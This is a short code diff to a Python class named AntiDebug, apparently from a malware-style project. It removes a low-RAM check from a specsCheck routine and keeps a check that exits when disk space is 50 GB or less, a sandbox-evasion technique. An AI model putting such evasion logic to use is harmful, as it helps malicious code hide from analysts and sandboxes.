@@ -644,9 +644,6 @@ class AntiDebug(functions):
                 self.programExit()
 
     def specsCheck(self):
-        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
-        if int(ram) <= 3:  # 3gb or less ram
-            self.programExit()
         disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
         if int(disk) <= 50:  # 50gb or less disc space
             self.programExit()
